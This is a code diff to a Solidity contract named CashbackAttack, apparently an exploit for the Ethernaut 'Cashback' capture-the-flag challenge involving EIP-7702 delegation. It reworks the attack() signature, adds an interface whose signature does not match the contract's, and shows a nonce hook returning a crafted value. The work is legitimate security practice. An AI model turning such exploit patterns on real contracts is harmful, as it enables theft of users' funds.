@@ -16,6 +16,10 @@ uint256 constant FREEDOM_CASHBACK_RATE = 200;
 uint256 constant FREEDOM_MAX_CASHBACK = 0x1b1ae4d6e2ef500000;
 bytes32 constant UNLOCKED_TRANSIENT = keccak256("cashback.storage.Unlocked");
 
+interface ICashbackAttack {
+    function attack(address cashbackAddr, address player, address currencyAddr, uint256 expenseAmt, uint256 cashbackAmt) external;
+}
+
 contract CashbackAttack {
     /// events
     event SetNonce(uint256 indexed);
@@ -27,7 +31,7 @@ contract CashbackAttack {
     mapping(Currency => uint256 Rate) public cashbackRates;
     mapping(Currency => uint256 MaxCashback) public maxCashback;
 
-    function attack(address player, address cashbackAddr) external {
+    function attack(address cashbackAddr, address player, address currencyAddr, uint256 amount) external {
         // ref: https://hackernoon.com/exploiting-eip-7702-delegation-in-the-ethernaut-cashback-challenge-a-step-by-step-writeup
         Cashback cashback = Cashback(payable(cashbackAddr));
 
@@ -59,7 +63,7 @@ contract CashbackAttack {
     function consumeNonce() external returns (uint256) {
         // We can mint only one NFT, because they are minted with id of the contract
         if (nftMinted) {
-              return 0;
+            return 0;
         }
         nftMinted = true;
         return 10_000;
